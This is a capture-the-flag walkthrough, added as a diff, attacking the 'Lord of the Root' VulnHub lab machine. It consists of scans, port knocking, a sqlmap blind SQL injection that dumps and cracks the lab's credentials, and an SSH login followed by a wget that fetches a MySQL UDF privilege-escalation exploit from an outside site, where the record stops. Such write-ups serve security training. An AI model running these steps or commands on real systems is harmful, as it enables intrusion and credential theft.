@@ -1,0 +1,1087 @@
+URL : https://www.vulnhub.com/entry/lord-of-the-root-101,129/
+
+1.) Identify the IP address of the victim machine
+root@kali:~# netdiscover 
+ Currently scanning: 192.168.193.0/16   |   Screen View: Unique Hosts                                                                                                                                             
+
+ 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                  
+ _____________________________________________________________________________
+   IP            At MAC Address      Count  Len   MAC Vendor                   
+ ----------------------------------------------------------------------------- 
+ 192.168.174.1   00:50:56:c0:00:08    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.2   00:50:56:ff:fc:d3    01    060   VMWare, Inc.                                                                                                                                                    
+ 192.168.174.128 00:0c:29:2a:4f:13    01    060   VMware, Inc.                                                                                                                                                    
+ 192.168.174.254 00:50:56:f2:16:b6    01    060   VMWare, Inc.                                                                                                                                                    
+
+root@kali:~# 
+ 
+2.) Run an nmap syn scan to identify open ports and running services
+root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 -v 192.168.174.128
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-12-01 11:19 EST
+NSE: Loaded 118 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating ARP Ping Scan at 11:19
+Scanning 192.168.174.128 [1 port]
+Completed ARP Ping Scan at 11:19, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 11:19
+Completed Parallel DNS resolution of 1 host. at 11:19, 0.16s elapsed
+Initiating SYN Stealth Scan at 11:19
+Scanning 192.168.174.128 [65535 ports]
+Discovered open port 22/tcp on 192.168.174.128
+SYN Stealth Scan Timing: About 22.94% done; ETC: 11:22 (0:01:44 remaining)
+SYN Stealth Scan Timing: About 58.53% done; ETC: 11:21 (0:00:43 remaining)
+Completed SYN Stealth Scan at 11:21, 88.71s elapsed (65535 total ports)
+Initiating Service scan at 11:21
+Scanning 1 service on 192.168.174.128
+Completed Service scan at 11:21, 6.01s elapsed (1 service on 1 host)
+Initiating OS detection (try #1) against 192.168.174.128
+NSE: Script scanning 192.168.174.128.
+Initiating NSE at 11:21
+Completed NSE at 11:21, 0.14s elapsed
+Nmap scan report for 192.168.174.128
+Host is up (0.00074s latency).
+Not shown: 65534 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     (protocol 2.0)
+| ssh-hostkey: 
+|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
+|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
+|_  256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.47%I=7%D=12/1%Time=565DC90A%P=i686-pc-linux-gnu%r(NULL,2
+SF:B,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\.3\r\n");
+MAC Address: 00:0C:29:2A:4F:13 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Uptime guess: 0.011 days (since Tue Dec  1 11:06:14 2015)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=257 (Good luck!)
+IP ID Sequence Generation: All zeros
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.74 ms 192.168.174.128
+
+NSE: Script Post-scanning.
+Initiating NSE at 11:21
+Completed NSE at 11:21, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.57 seconds
+           Raw packets sent: 131180 (5.774MB) | Rcvd: 81 (3.652KB)
+root@kali:~# 
+
+3.) Enumerate SSH
+root@kali:~# ssh 192.168.174.128
+The authenticity of host '192.168.174.128 (192.168.174.128)' can't be established.
+ECDSA key fingerprint is f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '192.168.174.128' (ECDSA) to the list of known hosts.
+
+                                                  .____    _____________________________
+                                                  |    |   \_____  \__    ___/\______   \
+                                                  |    |    /   |   \|    |    |       _/
+                                                  |    |___/    |    \    |    |    |   \
+                                                  |_______ \_______  /____|    |____|_  /
+                                                          \/       \/                 \/
+ ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
+|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
+|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
+|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
+        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
+Easy as 1,2,3
+root@192.168.174.128's password: 
+
+4.) Port knocking
+root@kali:~# nmap -T4 -r --max-retries=0 -p1-3 192.168.174.128
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-12-01 11:38 EST
+Warning: 192.168.174.128 giving up on port because retransmission cap hit (0).
+Nmap scan report for 192.168.174.128
+Host is up (0.00024s latency).
+PORT  STATE    SERVICE
+1/tcp filtered tcpmux
+2/tcp filtered compressnet
+3/tcp filtered compressnet
+MAC Address: 00:0C:29:2A:4F:13 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.35 seconds
+root@kali:~# 
+
+5.) Running the nmap scan again
+root@kali:~# nmap -p 1-65535 -sV -sS -A -T4 192.168.174.128
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2015-12-01 11:45 EST
+Nmap scan report for 192.168.174.128
+Host is up (0.00046s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     (protocol 2.0)
+| ssh-hostkey: 
+|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd (DSA)
+|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 (RSA)
+|_  256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 (ECDSA)
+1337/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port22-TCP:V=6.47%I=7%D=12/1%Time=565DCF0F%P=i686-pc-linux-gnu%r(NULL,2
+SF:B,"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\.3\r\n");
+MAC Address: 00:0C:29:2A:4F:13 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.11 - 3.14
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.46 ms 192.168.174.128
+
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 101.34 seconds
+root@kali:~# 
+
+6.) Open in browser as HTTP service is running on 1337
+http://192.168.174.128:1337/
+
+7.) Run Dirbuster
+root@kali:~# dirb http://192.168.174.128:1337/
+
+-----------------
+DIRB v2.21    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Dec  1 11:49:10 2015
+URL_BASE: http://192.168.174.128:1337/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4592                                                          
+
+---- Scanning URL: http://192.168.174.128:1337/ ----
+==> DIRECTORY: http://192.168.174.128:1337/images/                                                                                                                                                                
++ http://192.168.174.128:1337/index.html (CODE:200|SIZE:64)                                                                                                                                                       
++ http://192.168.174.128:1337/server-status (CODE:403|SIZE:297)                                                                                                                                                   
+
+---- Entering directory: http://192.168.174.128:1337/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+
+-----------------
+DOWNLOADED: 4592 - FOUND: 2
+root@kali:~# 
+
+8.) Access a 404 page
+http://192.168.174.128:1337/asdf
+View page source
+<html>
+<img src="/images/hipster.jpg" align="middle">
+<!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh>
+</html>
+Base64 decode
+root@kali:~# echo "THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh" | base64 -d
+Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!
+root@kali:~#  
+root@kali:~# echo "Lzk3ODM0NTIxMC9pbmRleC5waHA=" | base64 -d
+/978345210/index.php
+root@kali:~# 
+
+9.) Check the page http://192.168.174.128:1337/978345210/index.php for SQL injection
+root@kali:~/Downloads/sqlmap-master# ./sqlmap.py -u "http://192.168.174.128:1337/978345210/index.php" --data "username=aaaaaa&password=bbbb&submit=+Login+" --not-string="Username or Password is invalid"
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-201511250893}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 11:54:56
+
+[11:54:57] [INFO] testing connection to the target URL
+[11:54:57] [INFO] heuristics detected web page charset 'ascii'
+[11:54:57] [INFO] testing if POST parameter 'username' is dynamic
+[11:54:57] [INFO] confirming that POST parameter 'username' is dynamic
+[11:54:57] [INFO] POST parameter 'username' is dynamic
+[11:54:57] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[11:54:57] [INFO] testing for SQL injection on POST parameter 'username'
+[11:54:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[11:54:57] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Parameter replace'
+[11:54:57] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause'
+[11:54:57] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[11:54:57] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
+[11:54:57] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[11:54:57] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace'
+[11:54:57] [INFO] testing 'MySQL inline queries'
+[11:54:57] [INFO] testing 'PostgreSQL inline queries'
+[11:54:57] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[11:54:57] [INFO] testing 'MySQL > 5.0.11 stacked queries (SELECT - comment)'
+[11:54:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[11:54:57] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[11:54:57] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[11:54:57] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (SELECT)'
+[11:55:07] [INFO] POST parameter 'username' seems to be 'MySQL >= 5.0.12 AND time-based blind (SELECT)' injectable 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
+[11:55:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[11:55:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+sqlmap got a 302 redirect to 'http://192.168.174.128:1337/978345210/profile.php'. Do you want to follow? [Y/n] 
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] 
+[11:55:26] [INFO] target URL appears to be UNION injectable with 2 columns
+injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
+[11:55:28] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
+[11:55:28] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 110 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=aaaaaa' AND (SELECT * FROM (SELECT(SLEEP(5)))CUAr) AND 'lefz'='lefz&password=bbbb&submit= Login 
+---
+[11:55:45] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL 5.0.12
+[11:55:45] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.174.128'
+
+[*] shutting down at 11:55:45
+
+root@kali:~/Downloads/sqlmap-master# 
+root@kali:~/Downloads/sqlmap-master# ./sqlmap.py -u "http://192.168.174.128:1337/978345210/index.php" --data "username=aaaaaa&password=bbbb&submit=+Login+" --not-string="Username or Password is invalid" --dbs
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-201512010893}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 11:58:11
+
+[11:58:11] [INFO] resuming back-end DBMS 'mysql' 
+[11:58:11] [INFO] testing connection to the target URL
+[11:58:11] [INFO] heuristics detected web page charset 'ascii'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=aaaaaa' AND (SELECT * FROM (SELECT(SLEEP(5)))CUAr) AND 'lefz'='lefz&password=bbbb&submit= Login 
+---
+[11:58:11] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL 5.0.12
+[11:58:11] [INFO] fetching database names
+[11:58:11] [INFO] fetching number of databases
+[11:58:11] [WARNING] time-based comparison requires larger statistical model, please wait..............................                                                                                           
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
+[12:00:25] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors 
+4
+[12:00:25] [INFO] retrieved: 
+[12:00:35] [INFO] adjusting time delay to 1 second due to good response times
+information_schema
+[12:01:46] [INFO] retrieved: Webapp
+[12:02:11] [INFO] retrieved: mysql
+[12:02:31] [INFO] retrieved: performance_schema
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] Webapp
+
+[12:03:42] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.174.128'
+
+[*] shutting down at 12:03:42
+
+root@kali:~/Downloads/sqlmap-master# ./sqlmap.py -u "http://192.168.174.128:1337/978345210/index.php" --data "username=aaaaaa&password=bbbb&submit=+Login+" --not-string="Username or Password is invalid" -D Webapp --dump
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-201512010893}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 12:06:34
+
+[12:06:34] [INFO] resuming back-end DBMS 'mysql' 
+[12:06:34] [INFO] testing connection to the target URL
+[12:06:34] [INFO] heuristics detected web page charset 'ascii'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=aaaaaa' AND (SELECT * FROM (SELECT(SLEEP(5)))CUAr) AND 'lefz'='lefz&password=bbbb&submit= Login 
+---
+[12:06:34] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL 5.0.12
+[12:06:34] [INFO] fetching tables for database: 'Webapp'
+[12:06:34] [INFO] fetching number of tables for database 'Webapp'
+[12:06:34] [WARNING] time-based comparison requires larger statistical model, please wait..............................                                                                                           
+[12:06:34] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors 
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
+1
+[12:06:43] [INFO] retrieved: 
+[12:06:53] [INFO] adjusting time delay to 1 second due to good response times
+Users
+[12:07:09] [INFO] fetching columns for table 'Users' in database 'Webapp'
+[12:07:09] [INFO] retrieved: 3
+[12:07:12] [INFO] retrieved: id
+[12:07:20] [INFO] retrieved: username
+[12:07:49] [INFO] retrieved: password
+[12:08:24] [INFO] fetching entries for table 'Users' in database 'Webapp'
+[12:08:24] [INFO] fetching number of entries for table 'Users' in database 'Webapp'
+[12:08:24] [INFO] retrieved: 5
+[12:08:27] [INFO] retrieved: 1
+[12:08:29] [INFO] retrieved: iwilltakethering
+[12:09:34] [INFO] retrieved: frodo
+[12:09:57] [INFO] retrieved: 2
+[12:10:00] [INFO] retrieved: MyPreciousR00t
+[12:10:58] [INFO] retrieved: smeagol
+[12:11:26] [INFO] retrieved: 3
+[12:11:29] [INFO] retrieved: AndMySword
+[12:12:08] [INFO] retrieved: aragorn
+[12:12:35] [INFO] retrieved: 4
+[12:12:39] [INFO] retrieved: AndMyBow
+[12:13:09] [INFO] retrieved: legolas
+[12:13:37] [INFO] retrieved: 5
+[12:13:41] [INFO] retrieved: AndMyAxe
+[12:14:08] [INFO] retrieved: gimli
+[12:14:28] [INFO] analyzing table dump for possible password hashes
+Database: Webapp
+Table: Users
+[5 entries]
++----+----------+------------------+
+| id | username | password         |
++----+----------+------------------+
+| 1  | frodo    | iwilltakethering |
+| 2  | smeagol  | MyPreciousR00t   |
+| 3  | aragorn  | AndMySword       |
+| 4  | legolas  | AndMyBow         |
+| 5  | gimli    | AndMyAxe         |
++----+----------+------------------+
+
+[12:14:28] [INFO] table 'Webapp.Users' dumped to CSV file '/root/.sqlmap/output/192.168.174.128/dump/Webapp/Users.csv'
+[12:14:28] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.174.128'
+
+[*] shutting down at 12:14:28
+
+root@kali:~/Downloads/sqlmap-master# 
+root@kali:~/Downloads/sqlmap-master# ./sqlmap.py -u "http://192.168.174.128:1337/978345210/index.php" --data "username=aaaaaa&password=bbbb&submit=+Login+" --not-string="Username or Password is invalid" -D mysql --tables
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20151118}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 23:33:47
+
+[23:33:47] [INFO] resuming back-end DBMS 'mysql' 
+[23:33:47] [INFO] testing connection to the target URL
+[23:33:47] [INFO] heuristics detected web page charset 'ascii'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=aaaaaa' AND (SELECT * FROM (SELECT(SLEEP(5)))Dxke) AND 'xMym'='xMym&password=bbbb&submit= Login 
+---
+[23:33:47] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL 5.0.12
+[23:33:47] [INFO] fetching tables for database: 'mysql'
+[23:33:47] [INFO] fetching number of tables for database 'mysql'
+[23:33:47] [INFO] resumed: 24
+[23:33:47] [INFO] resumed: columns_priv
+[23:33:47] [INFO] resumed: db
+[23:33:47] [INFO] resuming partial value: eve
+[23:33:47] [WARNING] time-based comparison requires larger statistical model, please wait..............................                                                                                           
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
+[23:34:35] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors 
+[23:34:45] [INFO] adjusting time delay to 1 second due to good response times
+nt
+[23:34:52] [INFO] retrieved: func
+[23:35:09] [INFO] retrieved: general_log
+[23:35:56] [INFO] retrieved: help_category
+[23:36:51] [INFO] retrieved: help_keyword
+[23:37:26] [INFO] retrieved: help_relation
+[23:38:04] [INFO] retrieved: help_topic
+[23:38:32] [INFO] retrieved: host
+[23:38:48] [INFO] retrieved: ndb_binlog_index
+[23:39:58] [INFO] retrieved: plugin
+[23:40:25] [INFO] retrieved: proc
+[23:40:39] [INFO] retrieved: procs_priv
+[23:41:11] [INFO] retrieved: proxies_priv
+[23:41:53] [INFO] retrieved: servers
+[23:42:21] [INFO] retrieved: slow_log
+[23:42:57] [INFO] retrieved: tables_priv
+[23:43:44] [INFO] retrieved: time_zone
+[23:44:19] [INFO] retrieved: time_zone_leap_second
+[23:45:20] [INFO] retrieved: time_zone_name
+[23:45:45] [INFO] retrieved: time_zone_transition
+[23:46:37] [INFO] retrieved: time_zone_transition_type
+[23:47:21] [INFO] retrieved: user
+Database: mysql
+[24 tables]
++---------------------------+
+| user                      |
+| columns_priv              |
+| db                        |
+| event                     |
+| func                      |
+| general_log               |
+| help_category             |
+| help_keyword              |
+| help_relation             |
+| help_topic                |
+| host                      |
+| ndb_binlog_index          |
+| plugin                    |
+| proc                      |
+| procs_priv                |
+| proxies_priv              |
+| servers                   |
+| slow_log                  |
+| tables_priv               |
+| time_zone                 |
+| time_zone_leap_second     |
+| time_zone_name            |
+| time_zone_transition      |
+| time_zone_transition_type |
++---------------------------+
+
+[23:47:37] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.174.128'
+
+[*] shutting down at 23:47:37
+
+root@kali:~/Downloads/sqlmap-master# ./sqlmap.py -u "http://192.168.174.128:1337/978345210/index.php" --data "username=aaaaaa&password=bbbb&submit=+Login+" --not-string="Username or Password is invalid" -D mysql -T user -C user,password --dump
+         _
+ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20151118}
+|_ -| . | |     | .'| . |
+|___|_  |_|_|_|_|__,|  _|
+      |_|           |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 23:57:56
+
+[23:57:56] [INFO] resuming back-end DBMS 'mysql' 
+[23:57:56] [INFO] testing connection to the target URL
+[23:57:56] [INFO] heuristics detected web page charset 'ascii'
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: username=aaaaaa' AND (SELECT * FROM (SELECT(SLEEP(5)))Dxke) AND 'xMym'='xMym&password=bbbb&submit= Login 
+---
+[23:57:56] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Apache 2.4.7, PHP 5.5.9
+back-end DBMS: MySQL 5.0.12
+[23:57:56] [INFO] fetching entries of column(s) '`user`, password' for table 'user' in database 'mysql'
+[23:57:56] [INFO] fetching number of column(s) '`user`, password' entries for table 'user' in database 'mysql'
+[23:57:56] [WARNING] time-based comparison requires larger statistical model, please wait..............................                                                                                           
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
+[23:58:04] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors 
+5
+[23:58:10] [INFO] retrieved: 
+[23:58:15] [INFO] adjusting time delay to 1 second due to good response times
+debian-sys-maint
+[23:59:13] [INFO] retrieved: *A55A9B9049F69BC2768C9284615361DFBD580B34
+[00:01:26] [INFO] retrieved: root
+[00:01:46] [INFO] retrieved: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
+[00:03:51] [INFO] retrieved: root
+[00:04:10] [INFO] retrieved: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
+[00:06:15] [INFO] retrieved: root
+[00:06:34] [INFO] retrieved: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
+[00:08:39] [INFO] retrieved: root
+[00:08:58] [INFO] retrieved: *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F
+[00:11:02] [INFO] analyzing table dump for possible password hashes
+[00:11:02] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] n
+do you want to crack them via a dictionary-based attack? [Y/n/q] 
+[00:11:43] [INFO] using hash method 'mysql_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/root/Downloads/sqlmap-master/txt/wordlist.zip' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 
+[00:11:48] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] 
+[00:11:50] [INFO] starting dictionary-based cracking (mysql_passwd)
+[00:11:50] [WARNING] multiprocessing hash cracking is currently not supported on this platform
+[00:11:56] [INFO] cracked password 'darkshadow' for hash '*4dd56158acdba81bfe3ff9d3d7375231596ce10f'                                                                                                              
+[00:12:05] [INFO] postprocessing table dump                                                                                                                                                                       
+Database: mysql
+Table: user
+[5 entries]
++------------------+--------------------------------------------------------+
+| user             | password                                               |
++------------------+--------------------------------------------------------+
+| debian-sys-maint | *A55A9B9049F69BC2768C9284615361DFBD580B34              |
+| root             | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F (darkshadow) |
+| root             | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F (darkshadow) |
+| root             | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F (darkshadow) |
+| root             | *4DD56158ACDBA81BFE3FF9D3D7375231596CE10F (darkshadow) |
++------------------+--------------------------------------------------------+
+
+[00:12:05] [WARNING] table 'mysql.`user`' dumped to CSV file '/root/.sqlmap/output/192.168.174.128/dump/mysql/user-f3649c95.csv'
+[00:12:05] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.174.128'
+
+[*] shutting down at 00:12:05
+
+root@kali:~/Downloads/sqlmap-master# 
+
+Method 1
+10.) MySQL 4.x/5.0 - User-Defined Function Local Privilege Escalation Exploit
+root@kali:~# ssh smeagol@192.168.174.128
+
+                                                  .____    _____________________________
+                                                  |    |   \_____  \__    ___/\______   \
+                                                  |    |    /   |   \|    |    |       _/
+                                                  |    |___/    |    \    |    |    |   \
+                                                  |_______ \_______  /____|    |____|_  /
+                                                          \/       \/                 \/
+ ____  __.                     __     ___________      .__                   .___ ___________      ___________       __
+|    |/ _| ____   ____   ____ |  | __ \_   _____/______|__| ____   ____    __| _/ \__    ___/___   \_   _____/ _____/  |_  ___________
+|      <  /    \ /  _ \_/ ___\|  |/ /  |    __) \_  __ \  |/ __ \ /    \  / __ |    |    | /  _ \   |    __)_ /    \   __\/ __ \_  __ \
+|    |  \|   |  (  <_> )  \___|    <   |     \   |  | \/  \  ___/|   |  \/ /_/ |    |    |(  <_> )  |        \   |  \  | \  ___/|  | \/
+|____|__ \___|  /\____/ \___  >__|_ \  \___  /   |__|  |__|\___  >___|  /\____ |    |____| \____/  /_______  /___|  /__|  \___  >__|
+        \/    \/            \/     \/      \/                  \/     \/      \/                           \/     \/          \/
+Easy as 1,2,3
+smeagol@192.168.174.128's password: 
+Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+214 packages can be updated.
+101 updates are security updates.
+
+                            .____    _____________________________                              
+                            |    |   \_____  \__    ___/\______   \                             
+                            |    |    /   |   \|    |    |       _/                             
+                            |    |___/    |    \    |    |    |   \                             
+                            |_______ \_______  /____|    |____|_  /                             
+                                    \/       \/                 \/                              
+ __      __       .__                                ___________      .__                   .___
+/  \    /  \ ____ |  |   ____  ____   _____   ____   \_   _____/______|__| ____   ____    __| _/
+\   \/\/   // __ \|  | _/ ___\/  _ \ /     \_/ __ \   |    __) \_  __ \  |/ __ \ /    \  / __ | 
+ \        /\  ___/|  |_\  \__(  <_> )  Y Y  \  ___/   |     \   |  | \/  \  ___/|   |  \/ /_/ | 
+  \__/\  /  \___  >____/\___  >____/|__|_|  /\___  >  \___  /   |__|  |__|\___  >___|  /\____ | 
+       \/       \/          \/            \/     \/       \/                  \/     \/      \/ 
+Last login: Tue Sep 22 12:59:38 2015 from 192.168.55.135
+smeagol@LordOfTheRoot:~$ ls
+Desktop  Documents  Downloads  examples.desktop  Music  Pictures  Public  Templates  Videos
+
+http://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/
+https://www.exploit-db.com/exploits/1518/
+
+smeagol@LordOfTheRoot:~$ wget 0xdeadbeef.info/exploits/raptor_udf2.c
